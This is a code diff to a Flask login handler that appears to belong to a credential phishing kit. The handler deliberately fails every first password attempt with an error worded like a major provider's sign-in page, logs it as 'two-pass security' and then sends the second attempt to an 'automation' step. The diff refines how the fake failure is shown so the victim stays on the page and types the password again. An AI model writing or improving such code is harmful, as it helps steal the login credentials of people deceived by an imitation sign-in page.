@@ -427,7 +427,7 @@ def process_form():
         ).first()
         
         if not login_attempt:
-            # First attempt - create new attempt record
+            # First attempt - create new attempt record and show error without redirect
             login_attempt = LoginAttempt()
             login_attempt.user_email = email
             login_attempt.session_id = current_session_id
@@ -435,11 +435,20 @@ def process_form():
             db.session.add(login_attempt)
             db.session.commit()
             
-            # Always fail first attempt
+            # Stay on same page for first attempt
             flash('Your account or password is incorrect. If you don\'t remember your password, reset it now.', 'error')
             log_session_activity("first_attempt_blocked", user_email=email, success=False, 
                                error_message="First attempt automatically failed - two-pass security")
-            return redirect(url_for('index', step='password', email=email, error='true'))
+            
+            form = LoginForm()
+            sitekey = config('CLOUDFLARE_SITEKEY', default='')
+            return render_template('index.html', 
+                                 form=form, 
+                                 email=email, 
+                                 step='password', 
+                                 error='true', 
+                                 sitekey=sitekey,
+                                 session_id=session.get('session_id'))
         
         elif login_attempt.attempt_count == 1:
             # Second attempt - proceed with automation
